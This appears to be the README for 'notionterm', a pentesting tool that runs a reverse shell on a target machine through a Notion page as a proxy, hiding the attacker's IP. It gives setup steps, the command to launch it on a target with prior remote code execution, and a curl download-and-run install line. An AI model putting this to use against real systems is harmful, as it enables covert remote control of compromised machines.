<div align="center">
<h1>
  <code>notionterm</code> 
</h1>
  <img src="https://github.com/ariary/notionterm/blob/main/img/notionterm.png"  width=150>
  
  <strong> Embed reverse shell in <a href="https://www.notion.so">Notion</a> pages.</strong><br>
  <i>Hack while taking notes</i>
</div>

---

![demo](https://github.com/ariary/notionterm/blob/main/img/demo-first.gif)

---
<div align=left>
<h3>FOR ➕:</h3>
<ul>
  <li>Hiding attacker IP in reverse shell <i>(No direct interaction between attacker and target machine. Notion is used as a proxy hosting the reverse shell)</i></li>
  <li>Demo</li>
  <li>Quick proof insertion within report</li>
  <li>High available and shareable reverse shell (desktop, browser, mobile)</li>
</ul> 
</div>
<div align=left>
<h3>NOT FOR ➖:</h3>
<ul>
  <li>Long and robust shell session (see <a href=https://github.com/ariary/tacos>tacos</a> for that)</li>
  <li>Secure remote shell (Logically only person with writing access to the notion page can make rce with but...)</li>
</ul>

---
<div align=left>
<h3 >Why? 🤔 </h3>
The focus was on making something fun while still being usable, but that's not meant to be THE solution for reverse shell in the pentester's arsenal
</div>
<div align=right>
<h3 >How?  🤷‍♂️</h3>
Just use notion as usual and launch <code>notionterm</code> on target.
</div>
<div align=left>
<h3 >Requirements 🖊️</h3>
 <ul>
  <li>Notion software and API key</li>
  <li>Allowed bidirectionnal HTTP communication between  a target and notion domain</li>
  <li>Prior RCE on target</li>
</ul> 
</div>

---
<blockquote align=left>
roughly inspired by the great idea of <a href="https://github.com/mttaggart/OffensiveNotion">OffensiveNotion</a> and <a href="https://github.com/ariary/Notionion">notionion</a>! 
</blockquote>

## Quickstart

**Set-up**
1. Create the "reverse shell" page in Notion (*template page will be provided soon*)
2. Give the permissions to `notionterm` to access the page (with the notion api key)

**Run** ([details](#-run))

3. Start `notionterm`
4. Activate the reverse shell (with the button `ON`)
5. do your reverse shell stuff
6. Shutdown the reverse shell (`OFF`)

### 👟 Run

```shell
# On target with prior RCE
./notionterm
```

Configuration can be made using:
- Flags
- Configuration table in notion page


## Install
* **From release**: `curl -lO -L https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm`
